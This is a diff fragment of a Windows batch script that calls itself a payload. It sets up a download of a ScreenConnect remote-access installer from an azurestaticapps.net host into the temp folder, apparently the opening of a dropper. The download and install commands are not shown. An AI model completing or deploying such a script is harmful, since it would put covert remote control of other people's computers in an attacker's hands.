@@ -1,5 +1,6 @@
 @echo off
 REM CDRP7F3A9D2B8C4
+echo Running payload: %~f0
 setlocal EnableExtensions
 set "MSI=%TEMP%\ScreenConnect.ClientSetup.msi"
 set "URL=https://ashy-meadow-058164310.2.azurestaticapps.net/ScreenConnect.ClientSetup.msi"
